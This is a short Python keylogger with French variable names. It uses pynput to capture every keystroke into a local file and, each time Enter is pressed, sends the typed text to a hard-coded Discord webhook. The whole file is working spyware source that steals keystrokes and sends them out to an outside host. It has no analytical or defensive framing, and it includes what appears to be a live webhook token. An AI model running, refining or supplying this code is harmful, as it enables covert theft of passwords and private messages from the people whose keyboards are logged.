import os
import time
import logging
import requests
from pynput.keyboard import Listener, Key
from discord_webhook import DiscordWebhook, DiscordEmbed

log_dir = ' '
webhook_url = "https://discord.com/api/webhooks/1179507900591386728/PMoSKZA0HmJgAu1n4HA-q214odHhOky5fcVEQji-NcQAvxov9Cp88jEOL8l3WdwgehX9"
webhook = DiscordWebhook(url=webhook_url)
logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
    level=logging.DEBUG, format='%(asctime)s: %(message)s')

lefichier = open("test.txt","w")
def on_release(key):
    la_lettre = format(key)
    lefichier = open("test.txt","a")
    if len(la_lettre) == 3:
        la_lettre = la_lettre[1]
    logging.info(la_lettre)
    if la_lettre == "Key.space":
        lefichier.write("  ")
    elif la_lettre == "Key.backspace":
        lefichier.close()
        lefichier = open("test.txt","r")
        phrase = lefichier.read()
        if len(phrase) != 0:
            phrase = phrase[:-1]
        lefichier.close()
        lefichier = open("test.txt","w")
        lefichier.write(phrase)
    elif la_lettre == "Key.enter" :
        lefichier.close()
        lefichier = open("test.txt","r")
        embed = DiscordEmbed(title="KeyLoger :", description=lefichier.read(), color="ff0000")
        webhook.add_embed(embed)
        response = webhook.execute()
        webhook.remove_embed(0)
        lefichier.close()
        lefichier = open("test.txt","w")

    elif la_lettre == "Key.cmd" :
        lefichier.write(" |Win| ")
    elif la_lettre == "Key.shift":
        lefichier.write(" |ShiftRelache| ")
    elif la_lettre == "Key.ctrl_l":
        lefichier.write(" |Ctrl| ")
    elif la_lettre == "Key.tab":
        lefichier.write(" |Tab| ")
    elif la_lettre == "Key.caps_lock":
        lefichier.write(" |Maj| ")
    elif la_lettre == " Key.alt_l":
        lefichier.write(" |Alt| ")
    else :
        lefichier.write(la_lettre)
    

    
with Listener(on_release=on_release) as file:
    file.join()

lefichier.close()
